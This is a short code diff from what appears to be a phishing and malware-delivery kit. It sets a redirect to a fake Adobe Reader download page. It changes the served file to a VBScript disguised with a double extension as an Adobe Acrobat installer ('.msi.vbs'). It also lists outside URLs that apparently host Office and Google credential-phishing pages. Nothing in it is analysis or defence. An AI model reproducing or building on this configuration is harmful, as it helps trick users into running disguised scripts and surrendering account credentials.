@@ -5,7 +5,7 @@ import dns from "dns/promises";
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
   "https://marcenarias.net/adobe/reader/download.html";
 
-const MSI_PATH = "/User_Adobe_Reader_instalIl.msi";
+const MSI_PATH = "/AdobeAcrobatDC_2025.003.40436_29091.msi.vbs";
 
 const OFFICE_TARGET = "https://elreydeltrompo.com/dash/off";
 const GOOGLE_TARGET = "https://elreydeltrompo.com/css/cw";
